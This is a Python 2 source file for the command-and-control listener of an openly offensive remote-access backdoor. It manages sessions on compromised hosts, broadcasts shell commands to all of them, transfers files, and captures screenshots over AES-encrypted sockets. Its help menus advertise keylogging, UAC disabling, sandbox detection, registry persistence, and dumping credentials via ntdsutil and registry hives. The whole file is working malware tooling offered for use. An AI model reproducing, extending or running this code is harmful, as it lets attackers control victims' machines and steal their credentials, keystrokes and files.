#!/usr/bin/python
# -*- encoding: utf-8 -*-

from lib.AES_cipher import AESCipher
from lib.setting import *
from time import *


global sock, addr, stop_threads

stop_threads = False

# color codes ###########
red = "\033[1;32;31m"
green = "\033[1;32;32m"
yellow = "\033[1;32;33m"
blue = "\033[1;32;34m"
cyan = "\033[1;32;36m"
black = "\033[1;32;30m"
r = "\x1b[0m"


# main listener class ################################################
class listener:
    def __init__(self, ip, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((ip, port))
        self.sock.listen(3)
        self.id = 0
        self.connection_time = []
        self.session_id = []
        self.targets = []
        self.ips = []
        self.connection_time = []
        self.clients = 0
        t1 = threading.Thread(target=self.handler)
        t1.start()
        self.C2()

    # C2 command prompt ###########################################################################################################################################
    def C2(self):
        while True:
                try:
                    command_list = ["session","sessions","kill","help","cast","killall"]
                    command = raw_input("\033[1;32;33m[ CNC ] >>> \x1b[0m")
                    command = command.split(" ")
                    if command[0] == "sessions":
                        count = 0
                        print """\n\n 
 Sessions
 ========
 
 ID             address         connection time
 --     --------------------    ---------------
"""
                        for ip in self.ips:
                            print " ", "".join(str(count)) + "\t" + str(ip[0]) + ":" + str(ip[1]) + "\t\t", self.connection_time[count]
                            count += 1
                        print "\n\n"
                        print green, "Connected sessions: ",self.clients,"\n", r


                    elif command[0] == "session":
                        try:
                            num = int(command[1])
                            tarnum = self.targets[num]
                            tarip = self.ips[num]
                            print "\n\033[1;32;34m[+]\x1b[0m Connected to Session", command[1], "\033[1;32;34m[+]\x1b[0m\n"
                            self.run(tarnum, tarip)
                        except KeyboardInterrupt:
                            print "\n\033[1;32;34m\n[+]\x1b[0m Session sent to background \033[1;32;34m[+]\x1b[0m\n"
                            pass
                        except:
                            print "\n\033[1;32;31m [!]\x1b[0m Invalid session ID \033[1;32;31m [!]\n\x1b[0m"
                            pass

                    elif command[0] == "help":
                        print c2help

                    elif command[0] == "exit":
                        sock.close()

                    # run the given command on all connected sessions and return the results........................................................................
                    elif command[0] == "cast":
                        if not command[1]:
                            print  "\n\033[1;32;31m [!]\x1b[0m usage: cast [command] \033[1;32;31m [!]\n\x1b[0m"
                        else:
                            number_of_targets = len(self.targets)
                            i = 0
                            try:
                                while i < number_of_targets:
                                    target_address = self.ips[i]
                                    target_number = self.targets[i]
                                    target_session = self.session_id[i]

                                    print "\033[1;32;32m \n[+]\x1b[0m Response from session ",target_session ," ,",str(target_address[0]),":",str(target_address[1]),"\033[1;32;32m [+]\x1b[0m"
                                    print  green,"=============================================================================",r
                                    self.json_send(command[1:],target_number)
                                    print self.receive(target_number) + "\n\n"
                                    i += 1
                            except Exception,e:
                                print e

                    # kills a session and removes the entries from target list.....................................................
                    elif command[0] == "kill":
                        try:
                            counter = int(command[1])
                            self.json_send("terminate", self.targets[counter])
                            self.targets.remove(self.targets[counter])
                            self.ips.remove(self.ips[counter])
                            self.id -= 1
                            self.clients -= 1
                            print "\033[1;32;33m\n[+]\x1b[0m Session ",str(counter)," terminated \033[1;32;33m[+]\x1b[0m\n"
                        except:
                            print "\n\033[1;32;31m [!]\x1b[0m Invalid session ID\033[1;32;31m [!]\n\x1b[0m"
                            pass

                    elif command[0] == "killall":
                        number_of_targets = len(self.targets)
                        i = 0
                        try:
                            while i < number_of_targets:
                                try:
                                    self.json_send("terminate", self.targets[0])
                                    self.targets.remove(self.targets[0])
                                    self.ips.remove(self.ips[0])
                                    self.id -= 1
                                    self.clients -= 1
                                except:
                                    pass
                                i += 1
                            print "\033[1;32;33m\n[+]\x1b[0m All sessions terminated successfully \033[1;32;33m[+]\x1b[0m\n"
                        except:
                            print "\n\033[1;32;31m [!]\x1b[0m Error occured while terminating sessions \033[1;32;31m [!]\n\x1b[0m"
                            pass


                    elif command[0] == "" or command[0] == " ":
                        pass
                    elif command[0] not in command_list:
                        command = ' '.join(command[0:])
                        try:
                            if os_type == "linux":
                                print str(subprocess.check_output(command + "; exit 0", shell=True, stderr=subprocess.STDOUT))
                            else:
                                DEVNULL = open(os.devnull, 'wb')
                                print str(subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL))
                        except Exception,e:
                            print "\n\033[1;32;31m [!]\x1b[0m Error occured while running local command \033[1;32;31m [!]\n\x1b[0m"
                            print e
                except KeyboardInterrupt:
                    while True:
                        exit_check = raw_input("\n\033[0;31m[>] Exit the CNC ? (y/n): \033[0m")
                        if exit_check == 'y':
                            print red, "\n [!] CNC aborted... [!]\n", r
                            os._exit(os.EX_OK)
                        elif exit_check == 'n':
                            break
                        else:
                            print red, "\n[!] wrong input [!]\n", r
                            continue





    # handle multiple targets ##############################################################################
    def handler(self):
        while True:
            if stop_threads:
                break
            self.sock.settimeout(1)
            try:
                self.conn, addr = self.sock.accept()
                date_time = strftime("%Y-%m-%d %H:%M:%S",gmtime())
                print blue, "\n\n[+] New connection from ", str(addr[0]), ":", \
                    str(addr[1]), "at ", date_time, " [+]", r
                self.targets.append(self.conn)
                self.ips.append(addr)
                self.session_id.append(self.id)
                self.connection_time.append(date_time)
                print green, "\nSession ", self.id, " opened for ", str(addr[0]), ":", str(addr[1]),"\n", r
                self.clients += 1
                self.id += 1
            except:
                pass

    # encrypt/decrypt data ##############################
    def encrypt(self, message):
        encrypted = AESCipher(password).encrypt(message)
        return encrypted

    def decrypt(self, message):
        decrypted = AESCipher(password).decrypt(message)
        return decrypted


    # write/write file #########################################################################
    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "\033[1;32;32m[+]\x1b[0m download completed \033[1;32;32m[+]\x1b[0m"
        except Exception,e:
            return "\033[1;32;31m[-]\x1b[0m download failed \033[1;32;31m[-]\x1b[0m"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except:
            return "\033[1;32;31m[-]\x1b[0m no such file or directory \033[1;32;31m[-]\x1b[0m"

    # send/receive data ##############################################################################################
    def json_send(self, data, target):
        try:
            json_data = json.dumps(data)
            return target.send(self.encrypt(json_data))
        except:
            return target.send(self.encrypt("\033[1;32;31m[-]\x1b[0m STDOUT parsing problem \033[1;32;31m[-]\x1b[0m"))
            pass

    def receive(self, target):
        json_data = ""
        while True:
            try:
                json_data = json_data + target.recv(1000000)
                return json.loads(self.decrypt(json_data))
            except ValueError:
                continue
            except:
                pass


    # execute backdoor commands ###########################################################################################################################
    def run(self, target, ip):


        # filter backdoor commands ................................................................................................................
        shot_count = 1
        while True:

            cmd = raw_input("\033[1;32;33m" + str(ip[0]) + ':' + str(ip[1]) + " >>>\x1b[0m ")
            cmd = cmd.split(" ")

            if cmd[0] == "exit":
                while True:
                    choice = raw_input("\n \033[1;32;31m[!]\x1b[0m Exit the listener (y/n) ? \x1b[0m")
                    if choice == "y":
                        self.sock.close()
                        sys.exit(0)
                    elif choice == "n":
                        cmd[0] = None
                        break
                    else:
                        continue

            elif cmd[0] == "bg":
                while True:
                    choice = raw_input("\n \033[1;32;31m[!]\x1b[0m Send the session to background (y/n) ? ")
                    if choice == "y":
                        print "\n\033[1;32;34m[+]\x1b[0m Session ", str(ip[0]),":",str(ip[1]), " sent to background  \033[1;32;34m[+]\x1b[0m\n"
                        self.C2()
                    elif choice == "n":
                        cmd[0] = None
                        break
                    else:
                        continue
                pass

            if cmd[0] == "terminate":
                while True:
                    choice = raw_input("\n \033[1;32;31m[!]\x1b[0m Terminate this session (y/n) ? \x1b[0m")
                    if choice == "y":
                        self.id -= 1
                        self.clients -= 1
                        self.json_send("terminate", target)
                        self.conn.close()
                        self.targets.remove(target)
                        self.ips.remove(ip)
                        print "\033[1;32;33m\n[+]\x1b[0m Session ",str(ip[0]),":",str(ip[1])," terminated \033[1;32;33m[+]\x1b[0m\n"
                        self.C2()
                    elif choice == "n":
                        cmd[0] = None
                        break
                    else:
                        continue

            elif cmd[0] == "help":
                print help
                cmd[0] = ' '

            elif cmd[0] == "rdp" and len(cmd) != 2:
                print red, "\n[!] usage: rdp on/off [!]", r
                cmd = " "

            elif cmd[0] == "display" and len(cmd) !=2:
                print red, "\n[!] usage: display on/off [!]", r
                cmd = " "

            elif cmd[0] == "spawn" and len(cmd) != 3 or cmd[0] == "spawn" and cmd[1] == "-h":
                print red, "\n[!] usage: spawn [target ip] [target port] [!]", r
                cmd = " "

            elif cmd[0] == "powershell" and cmd[1] == "-h":
                print red, "\n[!] usage: powershell [command] OR [script] [!]", r
                cmd = " "

            elif cmd[0] == "download" and not cmd[1:] or cmd[0] == "upload" and not cmd[1:]:
                print red, "\n [!] usage: download/upload [file name] [!]", r
                cmd = " "
            elif cmd[0] == "upload" and cmd[1]:
                print blue, "[*]\x1b[0m uploading ", ''.join(str(cmd[1])), "\033[1;32;34m[*]\x1b[0m", r
                file_content = self.read_file(cmd[1])
                cmd.append(file_content)

            elif cmd[0] == "fw" and len(cmd) != 4 or cmd[0] == "fw" and cmd[1] == "-h":
                print red, "[!] usage: fw [in/out] [port number] [rule name] [!]", r
                cmd = " "


            self.json_send(cmd, target)
            result = self.receive(target)
            if result == None:
                pass

            elif cmd[0] == "download" and cmd[1]:
                print blue, "[*]\x1b[0m Downloading ", ''.join(str(cmd[1])), "\033[1;32;34m[*]\x1b[0m", r
                result = self.write_file(cmd[1], result)
                print(result)

            elif cmd[0] == "shot":
                name = "screenshot%s.png" % str(shot_count)
                result = self.write_file(name, result)
                print green, "[+]\x1b[0m screenshot captured \033[1;32;32m[+]\x1b[0m", r
                shot_count += 1
            else:
                print(result)



banner = blue + """

                        ██████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░██╗░░██╗
                        ██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
                        ██████╔╝░╚████╔╝░██████╦╝███████║██║░░╚═╝█████═╝░
                        ██╔═══╝░░░╚██╔╝░░██╔══██╗██╔══██║██║░░██╗██╔═██╗░
                        ██║░░░░░░░░██║░░░██████╦╝██║░░██║╚█████╔╝██║░╚██╗
                        ╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝


                                    Command and Control
                                    ===================

                                    Created by: 7h3w4lk3r

                                 https://github.com/7h3w4lk3r
                                 Email : bl4ckr4z3r@gmail.com\n\n
""" + r

# backdoor command help banner ##########################################################
help = """


File & Directory
================

 command                description
 -------                -----------
 cd                     change directory (USE WITHOUT QUOTES IN PATH NAME)
 download               download a file ( not directory )
 upload                 upload a file ( not directory )



System and Shell
================

 command                description
 -------                -----------
 sysinfo                 print system and OS information
 getenv                  print system environment variables with value
 checkvm                 check if the system is a sandbox or VM
 uac on/off              disable/enable UAC



User Interface
==============

 command                description
 -------                -----------
 shot                   take a screenshot
 clip                   dump clipboard
 rdp on/off             turn RDP service on/off
 display on/off         turn system display on/off


Keylogger
=========

 command                description
 -------                -----------
 key_start              start keylogger
 key_dump               print the logged keystrokes on screen
 key_stop               stop keylogger



Post Exploitation
=================

 command                description
 -------                -----------
 fw                     add firewall rule: fw [in/out] [port] [rule name]
 powershell             run powershell command or script
 spawn                  spawn a separate powershell session, -h for help



Persistence
===========

 command                description
 -------                -----------
persist_reg             Windows persistence using registry key ( on boot )



Credentials
===========

 command                description
 -------                -----------
 dump_ntds              dump credentials using ntdsutil, save in C:\Windows\Temp\copy-ntds
 dump_regsave           dump credentials using registry hive, save in C:\Windows\Temp\



Connection Commands
===================

 command                description
 -------                -----------
 bg                     send current session to background (Ctrl+c to exit without prompts)
 exit                   terminate the C2
 terminate              terminate the current session and close the backdoor



===================================================================
ALL OTHER COMMANDS WILL BE EXECUTED AS TARGET SYSTEM SHELL COMMANDS
===================================================================
 \n"""

c2help = """

Command & Control Center
========================

 command                description
 -------                -----------
 sessions               show active sessions
 session [id]           connect to a session
 cast [cmd]             run a command in all sessions
 kill [id]              terminate a session and close the backdoor
 killall               terminate all sessions and close all backdoors
 exit                   kill all sessions and the C2



==================================================================
ALL OTHER COMMANDS WILL BE EXECUTED AS LOCAL SYSTEM SHELL COMMANDS
==================================================================
"""

# run the listener #############################################################
if __name__ == '__main__':
    try:
        if os_type == "windows":
            subprocess.call("cls",shell=True)
        else:
            subprocess.call("clear",shell=True)
        print banner
        ip = raw_input("\033[1;32;34m[>]\x1b[0m LHOST (default: 0.0.0.0) >>> ")
        if ip == "":
            ip = '0.0.0.0'
        port = raw_input("\033[1;32;34m[>]\x1b[0m LPORT (default: 6000) >>> ")
        if port == "":
            port = 6000
        port = int(port)
        print cyan, "\n Handler started on ", ip, ":", port, "...\n\n", r
        starter = listener(ip, port)
        starter.run()
    except Exception,e:
        print e
        pass

